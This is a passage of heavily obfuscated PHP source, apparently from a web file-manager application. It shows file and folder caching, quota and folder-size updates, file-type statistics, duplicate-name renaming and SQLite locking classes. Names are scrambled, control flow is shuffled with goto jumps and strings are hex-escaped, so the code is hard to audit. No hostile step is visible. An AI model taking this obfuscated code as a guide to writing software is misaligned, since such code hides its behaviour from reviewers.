$d¡ŞØƒ£¼†[$bÀÁ¡å‹²ğ[28]]); $B¿¡æ†”‹÷ = $this->fileHistory($d¡ŞØƒ£¼†, $Añ‚–í§ª¦[$bÀÁ¡å‹²ğ[441]], $Añ‚–í§ª¦[$bÀÁ¡å‹²ğ[77]]); goto c©° ÈÀïÍ; eÌ™¯œ‰ÕË: $bÀÁ¡å‹²ğ =& $_SERVER[Â€Á›¨õ]; $d¡ŞØƒ£¼† = $this->sourceInfo($f‚™‡à»›); $dºÒÂ‹Çš = $this->fileInfoGet($f‚™‡à»›); goto c¼¨Ôäø”Š; c©° ÈÀïÍ: if (!$B¿¡æ†”‹÷) { return Model($bÀÁ¡å‹²ğ[444])->remove($Añ‚–í§ª¦[$bÀÁ¡å‹²ğ[441]]); } $this->folderSizeReset($d¡ŞØƒ£¼†[$bÀÁ¡å‹²ğ[472]]); return !0; goto C¬«Ëö¡’; C¬«Ëö¡’: } public function fileSubstr($fÆ»õ¶§¤, $D›„¿¨óè, $D†‹İ·Â™) { $AäÛ¯ğä¡ = $this->fileInfoGet($fÆ»õ¶§¤); if (!$AäÛ¯ğä¡) { return !1; } return IO::fileSubstr($AäÛ¯ğä¡[$_SERVER[Â€Á›¨õ][75]], $D›„¿¨óè, $D†‹İ·Â™); } public function fileInfoGet($aö¸³å‹) { goto bËŸ´ŒÙœò; bËŸ´ŒÙœò: $A…Î´£÷ğ¿ =& $_SERVER[Â€Á›¨õ]; $e½§ù°á = $this->sourceInfo($aö¸³å‹); if (!$e½§ù°á || $e½§ù°á[$A…Î´£÷ğ¿[397]]) { return !1; } goto aœôÀÂ‚’¢; aœôÀÂ‚’¢: $b¦­œŠö· = $A…Î´£÷ğ¿[447] . $e½§ù°á[$A…Î´£÷ğ¿[441]]; $f‚³§Î‹Å¢ = _get(self::$cacheFileInfo, $b¦­œŠö·); if ($f‚³§Î‹Å¢) { return $f‚³§Î‹Å¢; } goto fõÉ¤˜¡É; fõÉ¤˜¡É: $bÚÑß½•áÔ = Model($A…Î´£÷ğ¿[444])->fileInfo($e½§ù°á[$A…Î´£÷ğ¿[441]]); if ($bÚÑß½•áÔ) { $bÚÑß½•áÔ[$A…Î´£÷ğ¿[28]] = $e½§ù°á[$A…Î´£÷ğ¿[28]]; } self::$cacheFileInfo[$b¦­œŠö·] = $bÚÑß½•áÔ; goto EØÛğ—Ãò‘; EØÛğ—Ãò‘: return $bÚÑß½•áÔ; goto c©‚‰ßƒˆ»; c©‚‰ßƒˆ»: } private function folderChildrenNumber($CÃ½éˆ×‘ˆ) { $eÄ‚®Ş×àô =& $_SERVER[Â€Á›¨õ]; $fç¨«™º½ = $this->sourceInfo($CÃ½éˆ×‘ˆ); $F×¥ßÂ Àµ = array($eÄ‚®Ş×àô[548] => array($eÄ‚®Ş×àô[507], $fç¨«™º½[$eÄ‚®Ş×àô[481]] . $CÃ½éˆ×‘ˆ . $eÄ‚®Ş×àô[508]), $eÄ‚®Ş×àô[416] => intval($fç¨«™º½[$eÄ‚®Ş×àô[417]]), $eÄ‚®Ş×àô[541] => 1); $e¨ËÅôõ = $this->where($F×¥ßÂ Àµ)->count(); $C‘ŒÆ°Î¹ = $this->where($F×¥ßÂ Àµ)->where(array($eÄ‚®Ş×àô[541] => 0))->count(); return array($eÄ‚®Ş×àô[81] => $C‘ŒÆ°Î¹, $eÄ‚®Ş×àô[82] => $e¨ËÅôõ); } public function pathInfo($bÙ‚‰ˆ¢Æê, $dØŞëôÀ = false) { goto aÈÚ×ë…Óì; Dâ„ÖÂŞï£: $D”§–½Şî™ = $CîË÷µ‚òÇ[433] . intval($dØŞëôÀ) . $CîË÷µ‚òÇ[434] . $bÙ‚‰ˆ¢Æê; $CçÆ„à°¡… = _get(self::$cachePathInfo, $D”§–½Şî™); if ($CçÆ„à°¡…) { return $CçÆ„à°¡…; } goto Fæ¸Ï¥ÉË™; aÈÚ×ë…Óì: $CîË÷µ‚òÇ =& $_SERVER[Â€Á›¨õ]; $dØŞëôÀ = !1; $bÙ‚‰ˆ¢Æê = intval($bÙ‚‰ˆ¢Æê); goto Dâ„ÖÂŞï£; Fæ¸Ï¥ÉË™: $A†Œ˜Èé¦¸ = $this->sourceInfo($bÙ‚‰ˆ¢Æê); if (!$A†Œ˜Èé¦¸) { return !1; } $A†Œ˜Èé¦¸ = $this->_listDataApplyItem($A†Œ˜Èé¦¸, $dØŞëôÀ); goto EË£æ³ê×¦; EË£æ³ê×¦: self::$cachePathInfo[$D”§–½Şî™] = $A†Œ˜Èé¦¸; return $A†Œ˜Èé¦¸; goto DôÛÙËË¬®; DôÛÙËË¬®: } public static $cachePathInfoMore = array(); public function pathInfoMore($BÂ¨Ôà·í) { goto aÜËàù‚Å; B›°éà–±Ï: self::$cachePathInfoMore[$BÂ¨Ôà·í] = $E¥µ„ö£¢™; return $E¥µ„ö£¢™; goto bŒ»îĞ§ÚÂ; aÜËàù‚Å: $DåÇå¿å“ =& $_SERVER[Â€Á›¨õ]; $aÃº†ß¦µ› = _get(self::$cachePathInfoMore, $BÂ¨Ôà·í); if ($aÃº†ß¦µ›) { return $aÃº†ß¦µ›; } goto B†£ÅƒåŒÊ; B†£ÅƒåŒÊ: $E¥µ„ö£¢™ = $this->pathInfo($BÂ¨Ôà·í); if (!$E¥µ„ö£¢™) { return !1; } if ($E¥µ„ö£¢™[$DåÇå¿å“[397]] == $DåÇå¿å“[86]) { $E¥µ„ö£¢™[$DåÇå¿å“[80]] = $this->folderChildrenNumber($BÂ¨Ôà·í); } goto B›°éà–±Ï; bŒ»îĞ§ÚÂ: } public function sourceInfo($BĞ©ÚºĞø¤) { goto BÄÂ‚âà®; BÄÂ‚âà®: $fˆ“ÆŒœé• =& $_SERVER[Â€Á›¨õ]; if (!$BĞ©ÚºĞø¤) { return array(); } $BĞ©ÚºĞø¤ = intval($BĞ©ÚºĞø¤); goto Cò£ÊË¬; Cò£ÊË¬: $cÕ‡ÉôÜÀÉ = $fˆ“ÆŒœé•[432] . $BĞ©ÚºĞø¤; $Dœâ…‘¦¨¬ = _get(self::$cacheSourceInfo, $cÕ‡ÉôÜÀÉ); if ($Dœâ…‘¦¨¬) { return $Dœâ…‘¦¨¬; } goto DİÊ°„¦Å; DİÊ°„¦Å: $F»º‡¦ŞåŞ = $this->where(array($fˆ“ÆŒœé•[390] => $BĞ©ÚºĞø¤))->find(); self::$cacheSourceInfo[$cÕ‡ÉôÜÀÉ] = $F»º‡¦ŞåŞ; return self::$cacheSourceInfo[$cÕ‡ÉôÜÀÉ]; goto b¬Ã¬ˆß¿; b¬Ã¬ˆß¿: } public function sourceCacheClear($cªé„ëá¿© = false) { self::cacheClear($cªé„ëá¿©); } public static function cacheClear($AÔİ˜†¤ßß = false) { $DÊãõëïë™ =& $_SERVER[Â€Á›¨õ]; if ($AÔİ˜†¤ßß == !1) { goto A‚èÙŞï‚°; d´«Àİ­”: return; goto aÃèŠ‹¼ö; A‚èÙŞï‚°: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto DÇà³ò¹‘ƒ; DÇà³ò¹‘ƒ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto d´«Àİ­”; aÃèŠ‹¼ö: } unset(self::$cacheSourceInfo[$DÊãõëïë™[432] . $AÔİ˜†¤ßß]); unset(self::$cachePathInfoMore[$AÔİ˜†¤ßß]); unset(self::$cachePathInfo[$DÊãõëïë™[1949] . $AÔİ˜†¤ßß]); unset(self::$cachePathInfo[$DÊãõëïë™[1950] . $AÔİ˜†¤ßß]); } public function metaSet($F±‰˜Ş’ãõ, $B¬×›Èè’ = null, $f¯çº›²„ã = null) { $F‹ÍğŞ’ëˆ = parent::metaSet($F±‰˜Ş’ãõ, $B¬×›Èè’, $f¯çº›²„ã); if ($F‹ÍğŞ’ëˆ) { $this->sourceCacheClear($F±‰˜Ş’ãõ); } return $F‹ÍğŞ’ëˆ; } public function pathInfoByPath($e¢”’ƒÏáƒ, $D§áïŸ¾£Ğ) { $B¹óø‰¦’â =& $_SERVER[Â€Á›¨õ]; $e èôÈÓ³à = !$D§áïŸ¾£Ğ ? array() : explode($B¹óø‰¦’â[8], trim($D§áïŸ¾£Ğ, $B¹óø‰¦’â[8])); $aìĞ®è„† = $e¢”’ƒÏáƒ; foreach ($e èôÈÓ³à as $Bäå¯Ñâï) { $B‡£ÁÖŸö = array($B¹óø‰¦’â[472] => $aìĞ®è„†, $B¹óø‰¦’â[28] => $Bäå¯Ñâï); $aÆ’¥òÅø¸ = $this->where($B‡£ÁÖŸö)->select(); if (!$aÆ’¥òÅø¸) { return !1; } $aÆ’¥òÅø¸ = array_sort_by($aÆ’¥òÅø¸, $B¹óø‰¦’â[417]); $aìĞ®è„† = $aÆ’¥òÅø¸[0][$B¹óø‰¦’â[390]]; } return $this->pathInfo($aìĞ®è„†, !0); } protected function updateModifyTime($fÛÁ‰©ˆ¯) { goto B¼¯è­©†­; Bà’‘ÄÈå•: foreach ($fÛÁ‰©ˆ¯ as $fóØ©’Íá† => $C®ÀÛÎ¢„—) { $fÛÁ‰©ˆ¯[$fóØ©’Íá†] = intval($C®ÀÛÎ¢„—); $this->sourceCacheClear($C®ÀÛÎ¢„—); } $AÛÇÅ—´¼Û = array($cÓ¨‡ËˆˆÈ[390] => array($cÓ¨‡ËˆˆÈ[7], $fÛÁ‰©ˆ¯)); $fÂøÜšÍä = array($cÓ¨‡ËˆˆÈ[547] => USER_ID, $cÓ¨‡ËˆˆÈ[411] => time()); goto aÈ¬ëà¶†; B¼¯è­©†­: $cÓ¨‡ËˆˆÈ =& $_SERVER[Â€Á›¨õ]; if (!$fÛÁ‰©ˆ¯) { return; } if (!is_array($fÛÁ‰©ˆ¯)) { $fÛÁ‰©ˆ¯ = array($fÛÁ‰©ˆ¯); } goto Bà’‘ÄÈå•; aÈ¬ëà¶†: $this->where($AÛÇÅ—´¼Û)->save($fÂøÜšÍä); goto B§ÒÑ±¾ì; B§ÒÑ±¾ì: } public function folderSizeReset($eÊ‹®·¤®ì, $c…¢ ¶˜ © = false) { goto dÒº©„Êßà; fÙ½ÖÛÁæ›: $this->where($Ašƒ”¡ÙôÛ)->setAdd($B¿Å©­öõİ[77], $c…¢ ¶˜ ©); CacheLock::unlock($bÂíÉõ“äø); $CÄ„è¤†íÓ = $B¿Å©­öõİ[1952] . $C¯”³©®¼[$B¿Å©­öõİ[398]] . $B¿Å©­öõİ[4] . $C¯”³©®¼[$B¿Å©­öõİ[478]]; goto e‚ñï‚Êø‰; BÑîš½  : if ($c…¢ ¶˜ © == 0) { return CacheLock::unlock($bÂíÉõ“äø); } $d˜‡Î¥Ü—Ú = $this->parentLevelArray($C¯”³©®¼[$B¿Å©­öõİ[481]]); if (!$d˜‡Î¥Ü—Ú) { $d˜‡Î¥Ü—Ú = array(); } goto AÄã©ğµ´; dÒº©„Êßà: $B¿Å©­öõİ =& $_SERVER[Â€Á›¨õ]; if ($this->statusIgnoreResetSpace) { return; } $C¯”³©®¼ = $this->sourceInfo($eÊ‹®·¤®ì); goto C¯Ê»’³¥ø; AÄã©ğµ´: $d˜‡Î¥Ü—Ú[] = $C¯”³©®¼[$B¿Å©­öõİ[390]]; $Ašƒ”¡ÙôÛ = array($B¿Å©­öõİ[390] => array($B¿Å©­öõİ[405], $d˜‡Î¥Ü—Ú)); if ($c…¢ ¶˜ © < 0) { $Ašƒ”¡ÙôÛ[$B¿Å©­öõİ[77]] = array($B¿Å©­öõİ[947], abs($c…¢ ¶˜ ©)); } goto fÙ½ÖÛÁæ›; e‚ñï‚Êø‰: $C‡ôÔ›• = array($C¯”³©®¼[$B¿Å©­öõİ[398]], $C¯”³©®¼[$B¿Å©­öõİ[478]]); TaskRun::timeLimitCall($CÄ„è¤†íÓ, $B¿Å©­öõİ[1953], $C‡ôÔ›•, 1.5); goto BŒˆç£íÍ; C¯Ê»’³¥ø: $bÂíÉõ“äø = $B¿Å©­öõİ[1951] . $eÊ‹®·¤®ì; CacheLock::lock($bÂíÉõ“äø, 20); if ($c…¢ ¶˜ © === !1) { $this->sourceCacheClear($eÊ‹®·¤®ì); $C¯”³©®¼ = $this->sourceInfo($eÊ‹®·¤®ì); $Ašƒ”¡ÙôÛ = array($B¿Å©­öõİ[389] => $eÊ‹®·¤®ì, $B¿Å©­öõİ[416] => 0); $FÙ§˜Ø = $this->where($Ašƒ”¡ÙôÛ)->sum($B¿Å©­öõİ[77]); $c…¢ ¶˜ © = intval($FÙ§˜Ø) - intval($C¯”³©®¼[$B¿Å©­öõİ[77]]); } goto BÑîš½  ; BŒˆç£íÍ: } public function folderSizeResetChildren($B›°‚­½ƒ) { goto eßø’¤îá´; eóÄİŞ¹¡: foreach ($AÛ–ë‹Î¤å as $D‹ˆã™„×) { $dÅ™ù¼‘Á¢ = $D‹ˆã™„×[$Eí¡µã•µ[472]] . $Eí¡µã•µ[33]; if (!isset($FáãŸÓŞÑˆ[$dÅ™ù¼‘Á¢])) { continue; } if ($D‹ˆã™„×[$Eí¡µã•µ[417]] == $FáãŸÓŞÑˆ[$dÅ™ù¼‘Á¢][$Eí¡µã•µ[417]]) { $FáãŸÓŞÑˆ[$dÅ™ù¼‘Á¢][$Eí¡µã•µ[77]] += $D‹ˆã™„×[$Eí¡µã•µ[77]]; } } foreach ($FáãŸÓŞÑˆ as $D‹ˆã™„×) { $Cšéİ©ç– = $this->parentLevelArray($D‹ˆã™„×[$Eí¡µã•µ[481]]); foreach ($Cšéİ©ç– as $dÅ™ù¼‘Á¢) { $dÅ™ù¼‘Á¢ = $dÅ™ù¼‘Á¢ . $Eí¡µã•µ[33]; if (!isset($FáãŸÓŞÑˆ[$dÅ™ù¼‘Á¢])) { continue; } if ($D‹ˆã™„×[$Eí¡µã•µ[417]] == $FáãŸÓŞÑˆ[$dÅ™ù¼‘Á¢][$Eí¡µã•µ[417]]) { $FáãŸÓŞÑˆ[$dÅ™ù¼‘Á¢][$Eí¡µã•µ[77]] += $D‹ˆã™„×[$Eí¡µã•µ[77]]; } } } $dŠ¶ªùİÓá = array(); goto eª¼ÕÁáß; eßø’¤îá´: $Eí¡µã•µ =& $_SERVER[Â€Á›¨õ]; $this->sourceCacheClear($B›°‚­½ƒ); $e†Ê ªøŠÚ = $this->sourceInfo($B›°‚­½ƒ); goto dÓÖá”ÏÖ; A»•ÖãÌ­Â: $c®Î‚·¬¶[$Eí¡µã•µ[397]] = 0; $AÛ–ë‹Î¤å = $this->field($CÊâ‹Ø‡Å)->where($c®Î‚·¬¶)->select(); if (!$AÛ–ë‹Î¤å) { return; } goto DåÆğ¸«áŒ; eª¼ÕÁáß: foreach ($FáãŸÓŞÑˆ as $D‹ˆã™„×) { if ($D‹ˆã™„×[$Eí¡µã•µ[77]] == $D‹ˆã™„×[$Eí¡µã•µ[1955]]) { continue; } $dŠ¶ªùİÓá[] = array($Eí¡µã•µ[390], $D‹ˆã™„×[$Eí¡µã•µ[390]], $Eí¡µã•µ[77], $D‹ˆã™„×[$Eí¡µã•µ[77]]); } $this->saveAll($dŠ¶ªùİÓá); goto a÷´£ºê‹¨; dÓÖá”ÏÖ: $c®Î‚·¬¶ = array($Eí¡µã•µ[541] => 1, $Eí¡µã•µ[548] => array($Eí¡µã•µ[507], $e†Ê ªøŠÚ[$Eí¡µã•µ[481]] . $B›°‚­½ƒ . $Eí¡µã•µ[508])); $CÊâ‹Ø‡Å = $Eí¡µã•µ[1954]; $FáãŸÓŞÑˆ = $this->field($CÊâ‹Ø‡Å)->where($c®Î‚·¬¶)->select(); goto A»•ÖãÌ­Â; DåÆğ¸«áŒ: $FáãŸÓŞÑˆ[] = $e†Ê ªøŠÚ; $FáãŸÓŞÑˆ = array_to_keyvalue($FáãŸÓŞÑˆ, $Eí¡µã•µ[390]); foreach ($FáãŸÓŞÑˆ as $B–ƒ¥–Ãˆ¾ => $D‹ˆã™„×) { $FáãŸÓŞÑˆ[$B–ƒ¥–Ãˆ¾][$Eí¡µã•µ[1955]] = $FáãŸÓŞÑˆ[$B–ƒ¥–Ãˆ¾][$Eí¡µã•µ[77]]; $FáãŸÓŞÑˆ[$B–ƒ¥–Ãˆ¾][$Eí¡µã•µ[77]] = 0; } goto eóÄİŞ¹¡; a÷´£ºê‹¨: } public function userSpaceReset($Cğ©›ÎÒ‡Ğ = false) { $BÎ’åµ± æ =& $_SERVER[Â€Á›¨õ]; $cš‰‰½İå = $this->where(array($BÎ’åµ± æ[398] => self::TYPE_USER, $BÎ’åµ± æ[478] => $Cğ©›ÎÒ‡Ğ, $BÎ’åµ± æ[397] => 0))->sum($BÎ’åµ± æ[77]); $cš‰‰½İå = !$cš‰‰½İå || $cš‰‰½İå <= 0 ? 0 : $cš‰‰½İå; Model($BÎ’åµ± æ[497])->userEdit($Cğ©›ÎÒ‡Ğ, array($BÎ’åµ± æ[1650] => $cš‰‰½İå)); } public function targetSpaceUpdate($cÌÏŸÊ„¤¸, $EÔßöêÇî) { $ašŠŠÄŒâ =& $_SERVER[Â€Á›¨õ]; if (!$EÔßöêÇî) { return; } if (!in_array($cÌÏŸÊ„¤¸, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Cá¦®‹‚´É = $this->targetSpaceSize($cÌÏŸÊ„¤¸, $EÔßöêÇî); if ($cÌÏŸÊ„¤¸ == self::TYPE_USER) { Model($ašŠŠÄŒâ[497])->userEdit($EÔßöêÇî, array($ašŠŠÄŒâ[1650] => $Cá¦®‹‚´É)); } else { if ($cÌÏŸÊ„¤¸ == self::TYPE_GROUP) { Model($ašŠŠÄŒâ[480])->groupEdit($EÔßöêÇî, array($ašŠŠÄŒâ[1650] => $Cá¦®‹‚´É)); } } } public function targetSpaceSize($EçŞ™öêø , $fù‡¸Ğ‡Ÿ·) { goto f…ÇÒ‹„º; EŸ¢™Ø¾: $FÈ‡Ñ“éÓ® = array_to_keyvalue($FÈ‡Ñ“éÓ®, $Bš©²»É†¾[33], $Bš©²»É†¾[390]); $FÈ‡Ñ“éÓ® = array_unique(array_filter($FÈ‡Ñ“éÓ®)); if ($FÈ‡Ñ“éÓ®) { $F°öæ°òªµ = array($Bš©²»É†¾[404] => array($Bš©²»É†¾[405], $FÈ‡Ñ“éÓ®)); $dİùÏÂ×ˆÖ += floatval($this->where($F°öæ°òªµ)->sum($Bš©²»É†¾[77])); } goto CÉ­ìğ¹; CÉ­ìğ¹: $dİùÏÂ×ˆÖ = !$dİùÏÂ×ˆÖ || $dİùÏÂ×ˆÖ <= 0 ? 0 : $dİùÏÂ×ˆÖ; return $dİùÏÂ×ˆÖ; goto B‘ÖÄï••¯; D¸æÆËÑº›: $dİùÏÂ×ˆÖ = floatval($B²¢­«è·ï[$Bš©²»É†¾[77]]); $F°öæ°òªµ = array($Bš©²»É†¾[548] => array($Bš©²»É†¾[507], $Bš©²»É†¾[493] . $B²¢­«è·ï[$Bš©²»É†¾[390]] . $Bš©²»É†¾[508])); $FÈ‡Ñ“éÓ® = Model($Bš©²»É†¾[415])->field($Bš©²»É†¾[404])->where($F°öæ°òªµ)->select(); goto EŸ¢™Ø¾; f…ÇÒ‹„º: $Bš©²»É†¾ =& $_SERVER[Â€Á›¨õ]; $B²¢­«è·ï = $this->sourceRoot($EçŞ™öêø , $fù‡¸Ğ‡Ÿ·, !0); if (!$B²¢­«è·ï) { return 0; } goto D¸æÆËÑº›; B‘ÖÄï••¯: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Bö¿¢·ºçì) { return $this->fileTypeProfile($Bö¿¢·ºçì, SourceModel::TYPE_USER); } public function groupFileTypeProfile($b˜¢èÕËã) { return $this->fileTypeProfile($b˜¢èÕËã, SourceModel::TYPE_GROUP); } private function fileTypeProfile($c“»Ëê©±ø, $B‹Ô¸Öƒõ–) { goto fÑ‹‡²  Œ; Cø—Íáäù: $D¹ØÌÔ´ï… = array(); $D¹ØÌÔ´ï…[$C»ô§ïÆÛÙ[1957]] = array($C»ô§ïÆÛÙ[1958] => LNG($C»ô§ïÆÛÙ[1957]), $C»ô§ïÆÛÙ[1959] => $this->where($Aç²íÄÉ¡)->count(), $C»ô§ïÆÛÙ[543] => $this->where($Aç²íÄÉ¡)->sum($C»ô§ïÆÛÙ[77])); $D±¨Œ…Ó¥’ = KodIO::fileTypeList(); goto AŞ±¡—¼‚; d–¡§¹Ş¢Ú: if ($aÅ–äÍ¿×™) { return $aÅ–äÍ¿×™; } $Aç²íÄÉ¡ = array($C»ô§ïÆÛÙ[541] => 0); if ($c“»Ëê©±ø != !1) { $Aç²íÄÉ¡[$C»ô§ïÆÛÙ[478]] = $c“»Ëê©±ø; $Aç²íÄÉ¡[$C»ô§ïÆÛÙ[398]] = $B‹Ô¸Öƒõ–; } goto Cø—Íáäù; AŞ±¡—¼‚: foreach ($D±¨Œ…Ó¥’ as $CöÂò‡× => $B­‚ë½ğö) { $Aç²íÄÉ¡[$C»ô§ïÆÛÙ[399]] = $this->fileTypeWhere($CöÂò‡×); $D¹ØÌÔ´ï…[$CöÂò‡×] = array($C»ô§ïÆÛÙ[1958] => $B­‚ë½ğö[$C»ô§ïÆÛÙ[28]], $C»ô§ïÆÛÙ[1959] => $this->where($Aç²íÄÉ¡)->count(), $C»ô§ïÆÛÙ[543] => $this->where($Aç²íÄÉ¡)->sum($C»ô§ïÆÛÙ[77])); } Cache::set($eßğ´’Í, $D¹ØÌÔ´ï…, 1200); return $D¹ØÌÔ´ï…; goto f†Öéƒõˆ; fÑ‹‡²  Œ: $C»ô§ïÆÛÙ =& $_SERVER[Â€Á›¨õ]; $eßğ´’Í = $C»ô§ïÆÛÙ[1956] . $c“»Ëê©±ø . $C»ô§ïÆÛÙ[70] . $B‹Ô¸Öƒõ–; $aÅ–äÍ¿×™ = Cache::get($eßğ´’Í); goto d–¡§¹Ş¢Ú; f†Öéƒõˆ: } public function fileNameExist($b‘³â¥Îˆ, $BÈ«Ñö³¢¥) { $CßÊÃï“±† =& $_SERVER[Â€Á›¨õ]; $a´Æ´½´Ùí = $this->childList($b‘³â¥Îˆ); foreach ($a´Æ´½´Ùí as $eéÅòƒôÂ) { if ($eéÅòƒôÂ[$CßÊÃï“±†[28]] == $BÈ«Ñö³¢¥) { return $eéÅòƒôÂ[$CßÊÃï“±†[390]]; } if (strtolower($eéÅòƒôÂ[$CßÊÃï“±†[28]]) == strtolower($BÈ«Ñö³¢¥)) { return $eéÅòƒôÂ[$CßÊÃï“±†[390]]; } } return !1; } public function childList($e¬÷à¬Ç©ø) { goto Eå—‡áù; bŠ˜‹°œø¨: self::$cacheChildList[$fŠ×–¿ç] = $Fê¡Ã‡í«Ñ; foreach ($Fê¡Ã‡í«Ñ as $aâ³ŸóßêŒ) { $fŠ×–¿ç = $B¬»ª‚µÑÛ[432] . $aâ³ŸóßêŒ[$B¬»ª‚µÑÛ[390]]; self::$cacheSourceInfo[$fŠ×–¿ç] = $aâ³ŸóßêŒ; } return $Fê¡Ã‡í«Ñ; goto f÷…´ƒÙÑë; f‰Ëò§éâ‚: $eœ¬ËÉ¤„‰ = array($B¬»ª‚µÑÛ[472] => intval($e¬÷à¬Ç©ø), $B¬»ª‚µÑÛ[417] => 0); $Fê¡Ã‡í«Ñ = $this->where($eœ¬ËÉ¤„‰)->select(); $Fê¡Ã‡í«Ñ = $Fê¡Ã‡í«Ñ ? $Fê¡Ã‡í«Ñ : array(); goto bŠ˜‹°œø¨; Eå—‡áù: $B¬»ª‚µÑÛ =& $_SERVER[Â€Á›¨õ]; $fŠ×–¿ç = $B¬»ª‚µÑÛ[1934] . $e¬÷à¬Ç©ø; if (isset(self::$cacheChildList[$fŠ×–¿ç])) { return self::$cacheChildList[$fŠ×–¿ç]; } goto f‰Ëò§éâ‚; f÷…´ƒÙÑë: } public function fileNameAuto($Fí¸Ù·µ³Â, $aš›à‡ëä…, $E‰½Ú†× = REPEAT_RENAME, $E¾šÏ«¼¨ = false) { $AÇÙêõî·å =& $_SERVER[Â€Á›¨õ]; $a²‡Ôˆòß = $this->childList($Fí¸Ù·µ³Â); $aÏ…®Ó•Ë† = array_to_keyvalue($a²‡Ôˆòß, $AÇÙêõî·å[33], $AÇÙêõî·å[28]); return $this->fileNameAutoGet($aÏ…®Ó•Ë†, $aš›à‡ëä…, $E‰½Ú†×, $E¾šÏ«¼¨); } public function fileNameAutoGet($f°ºŠåšµŠ, $føÁãİÈ‰«, $e·„ƒÜõïù, $f½ç”Õö«æ) { $C¬öØ²Ãíà =& $_SERVER[Â€Á›¨õ]; if ($e·„ƒÜõïù == REPEAT_REPLACE || !$f°ºŠåšµŠ || !in_array_not_case($føÁãİÈ‰«, $f°ºŠåšµŠ) || $f½ç”Õö«æ && $e·„ƒÜõïù != REPEAT_RENAME_FOLDER) { return $føÁãİÈ‰«; } if ($e·„ƒÜõïù == REPEAT_SKIP) { return !1; } $aùò½ÔÁÕ = $C¬öØ²Ãíà[94] . get_path_ext($føÁãİÈ‰«); $aùò½ÔÁÕ = $aùò½ÔÁÕ == $C¬öØ²Ãíà[94] || $f½ç”Õö«æ ? $C¬öØ²Ãíà[33] : $aùò½ÔÁÕ; for ($fÁ¾í¢¿é· = 1; $fÁ¾í¢¿é· <= count($f°ºŠåšµŠ) + 1; $fÁ¾í¢¿é·++) { $eâíù‘ï = substr($føÁãİÈ‰«, 0, strlen($føÁãİÈ‰«) - strlen($aùò½ÔÁÕ)); $D¬‚Ë°Å„Õ = $eâíù‘ï . "\x28{$fÁ¾í¢¿é·}\51{$aùò½ÔÁÕ}"; if (!in_array_not_case($D¬‚Ë°Å„Õ, $f°ºŠåšµŠ)) { return $D¬‚Ë°Å„Õ; } } } } goto Bòï¦×÷ ; E¼ÅÆˆµË¸: class DbSqlite extends DbSqliteBase { public function query($dóóÆÏô) { $B©õŠ²éÒ« =& $_SERVER[Â€Á›¨õ]; if (!CacheLock::fileLock($B©õŠ²éÒ«[9])) { return !1; } $C…ÒîÀ°œ“ = parent::query($dóóÆÏô); CacheLock::fileUnLock($B©õŠ²éÒ«[9]); return $C…ÒîÀ°œ“; } public function execute($bÛ·éÂ™–†) { $BñÁ‘‚¢ñ½ =& $_SERVER[Â€Á›¨õ]; if (!CacheLock::fileLock($BñÁ‘‚¢ñ½[9])) { return !1; } $Aæ´à–Áà« = parent::execute($bÛ·éÂ™–†); CacheLock::fileUnLock($BñÁ‘‚¢ñ½[9]); return $Aæ´à–Áà«; } } class DbSqlite3 extends DbSqlite3Base { public function query($B“˜ ù¹) { $c£²Ÿ¢Ñİå =& $_SERVER[Â€Á›¨õ]; if (!CacheLock::fileLock($c£²Ÿ¢Ñİå[9])) { return !1; } $BŒ‡àÅæŒ‘ = parent::query($B“˜ ù¹); CacheLock::fileUnLock($c£²Ÿ¢Ñİå[9]); return $BŒ‡àÅæŒ‘; } public function execute($FÒ‹šªËÑ‡) { $f—Û³ÙØ¸Û =& $_SERVER[Â€Á›¨õ]; if (!CacheLock::fileLock($f—Û³ÙØ¸Û[9])) { return !1; } $E…áªš = parent::execute($FÒ‹šªËÑ‡); CacheLock::fileUnLock($f—Û³ÙØ¸Û[9]); return $E…áªš; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\x65\161" => "\x3c\76", "\147\164" => "\76", "\145\147\x74" => "\76\75", "\x6c\164" => "\x3c", "\x65\x6c\164" => "\74\x3d", "\156\x6f\x74\154\151\153\x65" => "\x4e\x4f\124\40\x4c\111\x4b\105", "\x6c\151\153\x65" => "\x4c\x49\113\105", "\151\x6e" => "\x49\116", "\x6e\x6f\164\151\x6e" => "\116\x4f\x54\x20\111\116", "\x6e\x6f\164\40\151\156" => "\x4e\117\124\x20\x49\116", "\x62\x65\x74\167\x65\145\x6e" => "\x42\x45\124\x57\x45\105\116", "\156\157\x74\x62\x65\x74\x77\145\x65\x6e" => "\116\117\x54\x20\x42\105\124\x57\105\x45\116", "\156\x6f\164\x20\x62\145\164\x77\x65\145\x6e" => "\x4e\117\x54\40\x42\x45\x54\127\105\105\116"); protected $selectSql = "\123\x45\x4c\105\x43\124\45\x44\x49\x53\124\x49\116\x43\124\45\40\x25\106\111\105\x4c\104\45\40\106\x52\117\x4d\40\x25\124\x41\102\x4c\x45\x25\x25\112\117\111\116\45\45\x57\110\x45\x52\105\45\45\107\x52\117\125\x50\x25\45\110\101\126\x49\x4e\x47\45\x25\x4f\122\104\105\x52\45\x25\x4c\111\x4d\x49\x54\45\40\45\x55\x4e\x49\x4f\x4e\x25\45\103\117\x4d\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $f´‡äËà±Ï = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Â€Á›¨õ][894], $f´‡äËà±Ï); } public function factory($d­çºŒÄª = '') { goto aÏÙæ£’¥; aÏÙæ£’¥: $c±ƒ…©Æ =& $_SERVER[Â€Á›¨õ]; $d­çºŒÄª = $this->parseConfig($d­çºŒÄª); if (empty($d­çºŒÄª[$c±ƒ…©Æ[895]])) { think_exception(think_lang($c±ƒ…©Æ[896])); } goto bìŒï…; bìŒï…: $this->dbType = ucwords(strtolower($d­çºŒÄª[$c±ƒ…©Æ[895]])); $DÎ±îˆ«¿ï = $c±ƒ…©Æ[897] . $this->dbType; if (class_exists($DÎ±îˆ«¿ï)) { $eÕõìòÍ¤  = new 